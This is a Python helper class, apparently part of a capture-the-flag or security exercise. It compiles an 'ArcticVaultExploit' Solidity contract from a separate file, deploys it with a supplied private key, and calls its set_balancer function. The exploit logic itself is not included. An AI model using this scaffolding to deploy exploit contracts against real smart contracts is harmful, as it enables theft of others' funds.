from web3 import Web3
from solcx import compile_source

class ArcticVaultExploitContract:
    ABI: dict
    BYTECODE: str
    SOURCE_CODE: str

    private_key: str
    owner_address: str
    web3: Web3
    contract = None
    contract_address: str

    def __init__(self, owner_address: str, private_key: str, rpc: str):
        self.owner_address = owner_address
        self.private_key = private_key
        self.web3 = Web3(Web3.HTTPProvider(rpc))
        
        # Read and compile the ArcticVaultExploit contract
        with open('./Exploit.sol', 'r') as file:
            self.SOURCE_CODE = file.read()

        compiled_sol = compile_source(self.SOURCE_CODE, solc_version="0.8.18")
        contract_interface = compiled_sol['<stdin>:ArcticVaultExploit']
        
        # Get ABI and Bytecode
        self.ABI = contract_interface['abi']
        self.BYTECODE = contract_interface['bin']

    def deploy(self):
        """Deploy the ArcticVaultExploit contract"""
        nonce = self.web3.eth.get_transaction_count(self.owner_address)
        transaction = {
            'from': self.owner_address,
            'gas': 8000000,
            'gasPrice': self.web3.to_wei('20', 'gwei'),
            'nonce': nonce
        }

        contract = self.web3.eth.contract(abi=self.ABI, bytecode=self.BYTECODE)
        transaction['data'] = contract.constructor().build_transaction(transaction)['data']

        signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
        tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
        print(f"Deployment transaction sent! TX hash: {tx_hash.hex()}")
        tx_receipt = self.web3.eth.wait_for_transaction_receipt(tx_hash)

        self.contract = self.web3.eth.contract(address=tx_receipt.contractAddress, abi=self.ABI)
        self.contract_address = tx_receipt.contractAddress
        print(f"ArcticVaultExploit deployed at: {self.contract_address}")

    def set_balancer(self):
        """Call the set_balancer function"""
        try:
            transaction = self.contract.functions.set_balancer().build_transaction({
                'from': self.owner_address,
                'gas': 800000,
                'gasPrice': self.web3.to_wei('20', 'gwei'),
                'nonce': self.web3.eth.get_transaction_count(self.owner_address)
            })

            signed_txn = self.web3.eth.account.sign_transaction(transaction, private_key=self.private_key)
            tx_hash = self.web3.eth.send_raw_transaction(signed_txn.rawTransaction)
            print(f"Set balancer transaction sent! TX hash: {tx_hash.hex()}")
        except Exception as e:
            print(f"Error in set_balancer: {e}")

    def attach(self, contract_address: str):
        """Attach to an existing ArcticVaultExploit contract"""
        try:
            self.contract_address = contract_address
            self.contract = self.web3.eth.contract(address=self.contract_address, abi=self.ABI)
            print(f"ArcticVaultExploit attached to: {self.contract_address}")
        except Exception as e:
            print(f"Error attaching to contract: {e}")
